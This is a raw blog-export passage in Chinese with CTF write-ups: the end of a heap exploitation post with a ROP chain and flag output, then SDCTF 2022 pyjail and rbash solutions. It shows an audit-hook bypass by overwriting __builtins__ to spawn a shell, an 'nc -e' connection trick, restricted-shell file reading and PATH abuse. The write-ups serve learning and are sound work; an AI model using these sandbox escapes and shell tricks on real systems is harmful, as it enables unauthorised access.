class="line">rop_chain+=p64(pop_rax)</span><br><span class="line">rop_chain+=p64(<span class="number">1</span>)</span><br><span class="line">rop_chain +=p64(or_syscall)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,rop_chain)</span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;brva 0x171B\nbrva 0x17A2\n&quot;)</span></span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>本地出的图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode                                                                                                                                                    </span><br><span class="line"> [DEBUG] Received <span class="number">0x100</span> <span class="built_in">bytes</span>:                                                                                                                                                       </span><br><span class="line">    <span class="number">00000000</span>  <span class="number">66</span> 6c <span class="number">61</span> <span class="number">67</span>  7b <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> 7d <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │flag│&#123;aaa│aa&#125;·│····│                                                                                              </span><br><span class="line">    <span class="number">000000</span>10  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │····│····│····│····│                                                                                              </span><br><span class="line">    *                                                                                                                                                                                </span><br><span class="line">    00000040  <span class="number">00</span> f0 a3 e6  9a 7f <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │····│····│····│····│                                                                                              </span><br><span class="line">    00000050  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │····│····│····│····│                                                                                              </span><br><span class="line">    *                                                                                                                                                                                </span><br><span class="line">    00000090  0f <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │····│····│····│····│                                                                                              </span><br><span class="line">    000000a0  01 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │····│····│····│····│                                                                                              </span><br><span class="line">    000000b0  b0 f6 a3 e6  9a 7f <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │····│····│····│····│                                                                                              </span><br><span class="line">    000000c0  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │····│····│····│····│                                                                                              </span><br><span class="line">    *                                                                                                                                                                                </span><br><span class="line">    <span class="number">00000</span>100                                                                                                                                                                         </span><br><span class="line">flag&#123;aaaaa&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf0\xa3\xe6\x9a\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x</span><br><span class="line"><span class="number">00</span>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf6\xa3\xe</span><br><span class="line"><span class="number">6</span>\x9a\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive              </span><br><span class="line">$ </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pyjail</title>
      <link href="/2022/05/08/pyjail/"/>
      <url>/2022/05/08/pyjail/</url>
      
        <content type="html"><![CDATA[<p>第一次学习有关pyjail喝bashjail相关知识。题目参考是sdctf2022</p><span id="more"></span><h1 id="starter"><a href="#starter" class="headerlink" title="starter"></a>starter</h1><p>这里看了介绍视频学习。一般的pyjail题目就是给一个python的交互界面，然后源码会给你，但是源码后面一些禁掉的东西可能不会告诉你。然后要读flag。也是第一次学。</p><h2 id="chall1"><a href="#chall1" class="headerlink" title="chall1"></a>chall1</h2><p>可以看到repl中，事先已经给我们读入了一个flag1。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">repl</span>():</span><br><span class="line">    global_dict = <span class="built_in">dict</span>()</span><br><span class="line">    global_dict[<span class="string">&#x27;flag1&#x27;</span>] = flag1 <span class="comment"># 事先读入了一个</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            src = <span class="built_in">input</span>(PROMPT)</span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="built_in">print</span>() <span class="comment"># print newline</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;canceled&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> src == <span class="string">&#x27;&#x27;</span>: <span class="comment"># Skip empty lines</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            code = <span class="built_in">compile</span>(src, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;single&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> SyntaxError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">exec</span>(code, global_dict)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><p>但是我们只允许执行白盒里面的参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">audit_hook</span>(<span class="params">event, _</span>):</span><br><span class="line">    <span class="comment"># These are the only necessary events for this Math REPL to work</span></span><br><span class="line">    ALLOWED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> event <span class="keyword">not</span> <span class="keyword">in</span> ALLOWED_EVENTS:</span><br><span class="line">        <span class="comment"># Thou shalt not hack!</span></span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation not permitted: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(event))</span><br></pre></td></tr></table></figure><p>注意,audit_hook是python3.8中的一种自定义钩子函数。相当于一个sandbox。</p><p>使用如下命令添加了一个<code>audit hook</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys.addaudithook(audit_hook)</span><br></pre></td></tr></table></figure><p>我们的flag1，应该和这个函数关系密切，但是我们无法阅读到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注意这里的proprietary并未给用户</span></span><br><span class="line">flag1 = proprietary.get_flag1()</span><br></pre></td></tr></table></figure><p>那么我们一开始应该是想知道这个类有什么特性。使用以下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>()</span><br><span class="line">[<span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;flag1&#x27;</span>]</span><br></pre></td></tr></table></figure><p>查看到当前运行空间中的所有类名称。</p><p>同样的，我们想看看flag1有什么内容，使用以下命令。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(flag1)</span><br><span class="line">[<span class="string">&#x27;-flag1-&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>, <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__weakref__&#x27;</span>]</span><br></pre></td></tr></table></figure><p>注意到其中有一个<code>-flag1-</code>是很罕见的。能不能执行呢?结论是不行，因为这里的”-“导致参数错误</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag1.-flag1-</span><br><span class="line">invalid syntax (&lt;string&gt;, line <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>那么有没有别的办法查看-flag1-的内容呢?<strong>这里使用了一个”getattr”的函数</strong>。我们来试试。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(flag1,<span class="string">&quot;-flag1-&quot;</span>)   </span><br><span class="line">REDACTED</span><br></pre></td></tr></table></figure><p>这里输出了一个READCTED。表示这个输出被编辑过了。<strong>注意，这个编辑并不是python自带的，而是出题的人加上的。python本身并不会报这个错</strong>。</p><p>尝试输出一下flag1的其他属性。发现也被patch过，不可输出。<strong>但是，如果我们用list的方式，切片输出其内容，会发现可以成功输出。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag1.__dict__</span><br><span class="line">&#123;<span class="string">&#x27;-flag1-&#x27;</span>: REDACTED&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(flag1,<span class="string">&quot;-flag1-&quot;</span>)[:]</span><br><span class="line"><span class="string">&#x27;flag&#123;flag1&#125;\n&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="chall2"><a href="#chall2" class="headerlink" title="chall2"></a>chall2</h2><p>这一次中，我们没有flag1这个变量。只能自己想办法把flag2变成类似flag1的变量，或者用其他办法。</p><p>在这里，我们针对<code>addaudithook</code>这个属性进行攻击。下面的方法证明，<code>audithook</code>本身并不是安全的沙箱。</p><p>注意到，我们在dir中，还有另外一个属性可用。<code>__builtins__</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>()</span><br><span class="line">[<span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;flag1&#x27;</span>]</span><br></pre></td></tr></table></figure><p>修改<code>__builtins__</code>，可以修改默认的内置函数的行为。回看源码。我们在audithook中使用了<code>set</code>。因此似乎只要想办法把set patch了即可。这里也是学到了新的方法。由于audithoon应该是每次执行repr之前都会被调用来检查参数，因此这个set也会每次被调用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__[<span class="string">&quot;set&quot;</span>] = <span class="keyword">lambda</span> x: &#123;<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>使用上面的语句，x表示输入参数，后面为返回值。这句话表示当我们调用set时，无论输入什么参数，返回的都是上面的内容。事实上，我们修改为上面内容加上一个os.system()</p><p>之后就可以愉快的拿flag了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.system(<span class="string">&quot;sh&quot;</span>)</span><br><span class="line">$ ls</span><br><span class="line">flag1.txt  flag2.txt  jail.py  properi  proprietary.py  __pycache__  test  test.c</span><br></pre></td></tr></table></figure><h1 id="Rbash-Warmup"><a href="#Rbash-Warmup" class="headerlink" title="Rbash Warmup"></a>Rbash Warmup</h1><p>这里一进去发现能用的命令不多</p><p><img src="/2022/05/08/pyjail/Users\15302\AppData\Roaming\Typora\typora-user-images\image-20220509093446353.png" alt="image-20220509093446353"></p><p>但是有nc可以用。这里学到一个方法。使用反向shell，并且是用-e的flag来执行文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rbash-5.0$ nc -lvp 1234 &amp;</span><br><span class="line">[1] 3</span><br><span class="line">rbash-5.0$ listening on [any] 1234 ...</span><br><span class="line">nc 127.0.0.1 1234 -e /flag</span><br><span class="line">127.0.0.1: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 38918</span><br><span class="line">sdctf&#123;nc--e-IS-r3aLLy-D4NG3R0U5!&#125;</span><br></pre></td></tr></table></figure><h1 id="Rbash-Yet-Another-Calculator"><a href="#Rbash-Yet-Another-Calculator" class="headerlink" title="Rbash Yet Another Calculator"></a>Rbash Yet Another Calculator</h1><p>可以看到nc没有了。</p><p><img src="/2022/05/08/pyjail/Users\15302\AppData\Roaming\Typora\typora-user-images\image-20220509103919244.png" alt="image-20220509103919244"></p><p>这里看到没有nc了，环境还是上一个rbash。但是没有ls，不知道flag的名称。</p><p>解法有以下几种</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rbash-5.0$ echo *</span><br><span class="line">flag-xEpAN7X3tGYjt4Y0p0FD.txt jail.sh</span><br><span class="line">rbash-5.0$ source flag-xEpAN7X3tGYjt4Y0p0FD.txt</span><br><span class="line">rbash: sdctf&#123;red1r3ct1ng_std1n_IS_p3rm1tt3d_1n_rb45h!&#125;: command not found</span><br><span class="line">rbash-5.0$ echo `&lt; flag-xEpAN7X3tGYjt4Y0p0FD.txt`</span><br><span class="line">sdctf&#123;red1r3ct1ng_std1n_IS_p3rm1tt3d_1n_rb45h!&#125;</span><br><span class="line">rbash-5.0$ read &lt; flag-xEpAN7X3tGYjt4Y0p0FD.txt;echo $REPLY</span><br><span class="line">sdctf&#123;red1r3ct1ng_std1n_IS_p3rm1tt3d_1n_rb45h!&#125;</span><br><span class="line">rbash-5.0$ echo &quot;$(&lt;flag-xEpAN7X3tGYjt4Y0p0FD.txt)&quot;</span><br><span class="line">sdctf&#123;red1r3ct1ng_std1n_IS_p3rm1tt3d_1n_rb45h!&#125;</span><br></pre></td></tr></table></figure><h1 id="Rbash-Negotiation-with-the-warden"><a href="#Rbash-Negotiation-with-the-warden" class="headerlink" title="Rbash Negotiation with the warden"></a>Rbash Negotiation with the warden</h1><p>这里限制了我们能访问的路径。我们只能添加特定的路径，在特定的路径下创建文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> opt == <span class="number">5</span>: <span class="comment"># Add a permitted PATH</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Want more paths to escape? But sorry you are only allowed to take some of our prespecified paths below:&quot;</span>)</span><br><span class="line">    print_paths(WHITELIST_PATHS)</span><br><span class="line">    pathnumstr = <span class="built_in">input</span>(<span class="string">&#x27;Select which paths to add (1-&#123;&#125;)&gt; &#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(WHITELIST_PATHS)))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pathnum = <span class="built_in">int</span>(pathnumstr)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">1</span> &lt;= pathnum &lt;= <span class="built_in">len</span>(WHITELIST_PATHS):</span><br><span class="line">            <span class="keyword">raise</span> ValueError</span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;Invalid index: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(pathnumstr))</span><br><span class="line">                <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>而且外边并没有<code>nc</code></p><p><img src="/2022/05/08/pyjail/Users\15302\AppData\Roaming\Typora\typora-user-images\image-20220509115906100.png" alt="image-20220509115906100"></p><p>这题有一个很神奇的地方，就是当你删除PATH，把path删除完了之后</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> opt == <span class="number">6</span>: <span class="comment"># Deprive myself of a permitted PATH</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Weird. I have never seen a prisoner who wants to voluntarily give up their own rights. But whatever.&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> PATH_LIST:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;You have no paths! Try adding one.&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        print_paths(PATH_LIST)</span><br><span class="line">        pathnumstr = <span class="built_in">input</span>(<span class="string">&#x27;Select which path to remove (1-&#123;&#125;)&gt; &#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(PATH_LIST)))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pathnum = <span class="built_in">int</span>(pathnumstr)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">1</span> &lt;= pathnum &lt;= <span class="built_in">len</span>(PATH_LIST):</span><br><span class="line">                <span class="keyword">raise</span> ValueError</span><br><span class="line">                <span class="keyword">except</span> ValueError:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;Invalid index: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(pathnumstr))</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">del</span> PATH_LIST[pathnum - <span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>删除完了之后，linux<code>会自动把path写成当前的工作目录</code>。这样我们就可以在rbash的目录中写文件了，并且可以改权限。</p><p>我们的流程如下。</p><ol><li>删除path，直到为空</li><li>新建一个note，命名为<code>vuln</code>，内容为</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">/flag</span><br></pre></td></tr></table></figure><ol start="3"><li>修改其权限为777</li><li>在rbash里面执行<code>vuln</code>即可。</li></ol><p><img src="/2022/05/08/pyjail/Users\15302\AppData\Roaming\Typora\typora-user-images\image-20220509115633394.png" alt="image-20220509115633394"></p><h1 id="Turing-complete-safeeval"><a href="#Turing-complete-safeeval" class="headerlink" title="Turing-complete safeeval"></a>Turing-complete safeeval</h1><p>看到源码中使用了<code>pwntools</code>中<code>pwnlib</code>的<code>safeval</code>。找到<a href="http://docs.pwntools.com/en/latest/util/safeeval.html?highlight=safeeval#module-pwnlib.util.safeeval">官网</a></p><p>主函数如下所示。主要是使用了test_expr检查我们的输入参数。之后调用eval执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">expr</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">if</span> TURING_COMPLETE:</span><br><span class="line">        c = safeeval.test_expr(e, complete_codes)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>(c)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> safeeval.expr(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Turing complete mode:&#x27;</span>, <span class="string">&#x27;on&#x27;</span> <span class="keyword">if</span> TURING_COMPLETE <span class="keyword">else</span> <span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        e = <span class="built_in">input</span>(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> e == <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(expr(e))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">            traceback.print_exc(file=sys.stdout)</span><br><span class="line"><span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure><p>其中 <code>test_expr</code>，链接为<a href="http://docs.pwntools.com/en/latest/util/safeeval.html?highlight=safeeval#pwnlib.util.safeeval.test_expr">链接</a></p><p><img src="/2022/05/08/pyjail/Users\15302\AppData\Roaming\Typora\typora-user-images\image-20220509110336077.png" alt="image-20220509110336077"></p><p>去查看对应的<a href="https://github.com/Gallopsled/pwntools/blob/ef698d4562024802be5cc3e2fa49333c70a96662/pwnlib/util/safeeval.py#L3">源码</a>发现作用是先把我们的输入编译一下，之后检查里面是否出现了相应的opecode.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_expr</span>(<span class="params">expr, allowed_codes</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;test_expr(expr, allowed_codes) -&gt; codeobj</span></span><br><span class="line"><span class="string">    Test that the expression contains only the listed opcodes.</span></span><br><span class="line"><span class="string">    If the expression is valid and contains only allowed codes,</span></span><br><span class="line"><span class="string">    return the compiled code object. Otherwise raise a ValueError</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">import</span> dis</span><br><span class="line">    allowed_codes = [dis.opmap[c] <span class="keyword">for</span> c <span class="keyword">in</span> allowed_codes <span class="keyword">if</span> c <span class="keyword">in</span> dis.opmap]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        c = <span class="built_in">compile</span>(expr, <span class="string">&quot;&quot;</span>, <span class="string">&quot;eval&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> SyntaxError:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;%r is not a valid expression&quot;</span> % expr)</span><br><span class="line">    codes = _get_opcodes(c)</span><br><span class="line">    <span class="keyword">for</span> code <span class="keyword">in</span> codes:</span><br><span class="line">        <span class="keyword">if</span> code <span class="keyword">not</span> <span class="keyword">in</span> allowed_codes:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;opcode %s not allowed&quot;</span> % dis.opname[code])</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们只能使用以下表格中opcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">_const_codes = [</span><br><span class="line">    <span class="string">&#x27;POP_TOP&#x27;</span>,<span class="string">&#x27;ROT_TWO&#x27;</span>,<span class="string">&#x27;ROT_THREE&#x27;</span>,<span class="string">&#x27;ROT_FOUR&#x27;</span>,<span class="string">&#x27;DUP_TOP&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;BUILD_LIST&#x27;</span>,<span class="string">&#x27;BUILD_MAP&#x27;</span>,<span class="string">&#x27;BUILD_TUPLE&#x27;</span>,<span 